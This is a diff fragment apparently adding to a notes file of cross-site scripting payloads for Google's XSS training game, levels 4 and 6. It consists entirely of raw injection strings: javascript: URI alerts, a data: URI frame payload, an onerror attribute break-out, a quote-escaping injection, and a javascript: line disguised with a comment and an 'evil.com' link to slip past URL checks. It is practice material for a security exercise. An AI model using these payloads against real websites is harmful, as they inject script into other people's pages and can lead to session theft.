@@ -2,11 +2,18 @@
 
 
 
+//
+
+//
+https://xss-game.appspot.com/level6/frame#data:text/plain,alert()
+// URL embed
+javascript:alert(document.domain);//https://evil.com/
 // url
 ');javascript:alert('DDD
 https://xss-game.appspot.com/level4/frame');javascript:alert('DDD
 //url
 #'onerror='alert()'
+
 // scheame href="javascript:alert(document.domain)"
 javascript:alert(document.domain)
 href="javascript:alert(document.domain)"
